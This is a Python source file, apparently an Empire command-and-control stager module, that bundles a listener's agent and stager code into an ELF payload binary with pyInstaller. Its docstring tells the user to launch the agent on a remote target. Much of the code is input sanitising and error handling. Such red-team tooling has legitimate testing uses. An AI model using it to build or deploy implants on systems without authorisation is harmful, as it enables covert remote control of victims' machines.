import shutil
import subprocess
import tempfile
from pathlib import Path, PureWindowsPath

from empire.server.core.exceptions import StagerGenerationException
from empire.server.utils.file_util import safe_filename

"""

Install steps...

- install pyInstaller
-- try:


- copy into stagers directory
-- ./Empire/lib/stagers/

- kick off the empire agent on a remote target
-- /tmp/empire &

@TweekFawkes

"""


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "pyInstaller Launcher",
            "Authors": [
                {
                    "Name": "Bryce Kunz",
                    "Handle": "@TweekFawkes",
                    "Link": "https://twitter.com/TweekFawkes",
                }
            ],
            "Description": "Generates an ELF binary payload launcher for Empire using pyInstaller.",
            "Comments": [],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "BinaryFile": {
                "Description": "Name for the generated binary. Any directory "
                "component is ignored; the artifact is delivered via OutFile.",
                "Required": True,
                "Value": "empire",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "launcher",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        binary_file_str = self.options["BinaryFile"]["Value"]
        encode = False

        if shutil.which("pyinstaller") is None:
            raise StagerGenerationException("pyInstaller is not installed.")

        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language=language,
            encode=encode,
            user_agent=user_agent,
        )
        if not launcher:
            raise StagerGenerationException("Error in launcher command generation.")

        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
            listener_name
        )

        agent_code = active_listener.generate_agent(
            active_listener.options, language=language
        )
        comms_code = active_listener.generate_comms(
            active_listener.options, language=language
        )

        stager_code = active_listener.generate_stager(
            active_listener.options,
            language=language,
            encrypt=False,
            encode=False,
        )

        # generate_*() return None on failure (e.g. a port_forward_pivot whose
        # parent listener is inactive or can't supply staging keys). Fail cleanly
        # rather than an opaque AttributeError from .splitlines() below.
        if agent_code is None or comms_code is None or stager_code is None:
            raise StagerGenerationException(
                f"Listener '{listener_name}' produced no agent/comms/stager code "
                "for pyinstaller stageless generation; if it is a "
                "port_forward_pivot, its parent listener may be inactive or unable "
                "to supply staging keys."
            )

        imports_list = []
        for code in [agent_code, comms_code, stager_code]:
            for line in code.splitlines():
                _line = line.strip()
                if _line.startswith("from System"):
                    # Skip Ironpython imports
                    pass
                elif _line.startswith("import ") or _line.startswith("from "):
                    imports_list.append(_line)

        imports_list.append("import trace")
        imports_list.append("import json")
        imports_list = list(set(imports_list))
        imports_str = "\n".join(imports_list)
        launcher = imports_str + "\n" + launcher

        # BinaryFile is a scratch name, not a delivery destination: the bytes are
        # read back below and delivered under OutFile by stager_service. Dropping
        # the directory component is therefore lossless, and it is load-bearing --
        # honoring it gave an operator an arbitrary server-side .py write.
        # safe_filename() is the shared basename guard (empty, NUL byte, "." and
        # ".."); PureWindowsPath splits on "\" as well as "/", so a Windows-style
        # BinaryFile reduces to its last component instead of becoming one long
        # backslash-laden file name.
        binary_name = safe_filename(PureWindowsPath(binary_file_str).name)
        if not binary_name:
            raise StagerGenerationException("BinaryFile must include a file name.")

        with tempfile.TemporaryDirectory() as build_root:
            # dist and work must be siblings, not nested. pyinstaller creates
            # --workpath as a directory, so putting it under --distpath lets a
            # BinaryFile named after it ("/tmp/build") claim the same path as the
            # artifact, and the read below dies with IsADirectoryError.
            dist_dir = Path(build_root) / "dist"
            work_dir = Path(build_root) / "work"
            dist_dir.mkdir()

            binary_path = dist_dir / binary_name
            # ".py" is appended, not substituted: pyinstaller names the onefile
            # artifact after the source stem, so with_suffix() would build
            # "agent" from "agent.bin" and the read below would miss it -- and
            # for a BinaryFile of "empire.py" the source and the artifact would
            # be the same path, handing the operator the plaintext launcher.
            source_path = dist_dir / f"{binary_name}.py"
            try:
                source_path.write_text(launcher, encoding="utf-8")
            except OSError as e:
                # A BinaryFile longer than the filesystem's NAME_MAX still gets
                # this far (ENAMETOOLONG), and an uncaught OSError here is the
                # same opaque 500 the build-failure guard below exists to avoid.
                raise StagerGenerationException(
                    f"Could not write the pyinstaller source for BinaryFile "
                    f"'{binary_name}': {e}"
                ) from e

            result = subprocess.run(
                [
                    "pyinstaller",
                    "-y",
                    "--clean",
                    "--specpath",
                    str(dist_dir),
                    "--distpath",
                    str(dist_dir),
                    "--workpath",
                    str(work_dir),
                    "--onefile",
                    str(source_path),
                ],
                check=False,
            )
            # Without this, a failed build reaches read_bytes() and raises
            # FileNotFoundError, which stager_service does not convert -- an
            # opaque 500 whose evidence the temp directory has already deleted.
            if result.returncode != 0 or not binary_path.is_file():
                raise StagerGenerationException(
                    f"pyinstaller exited with code {result.returncode} and "
                    f"produced no binary for BinaryFile '{binary_name}'; see the "
                    "server console for the pyinstaller output."
                )

            return binary_path.read_bytes()
